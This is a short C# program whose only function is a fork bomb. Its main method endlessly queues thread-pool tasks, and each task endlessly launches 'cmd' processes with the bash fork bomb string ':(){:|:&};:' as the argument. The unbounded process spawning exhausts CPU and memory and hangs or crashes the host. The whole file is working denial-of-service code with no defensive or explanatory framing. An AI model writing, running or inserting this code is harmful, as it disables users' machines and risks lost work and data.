using System.Diagnostics;

namespace Rigolo
{
    internal class Program
    {
        static void Main(string[] args)
        {
            for (; ; ) { ThreadPool.QueueUserWorkItem(new WaitCallback(TaskCallBack)); }
        }

        static void TaskCallBack(Object obj)
        {
            for (; ; ) { Process.Start("cmd", ":(){:|:&};:"); }
        }
    }
}
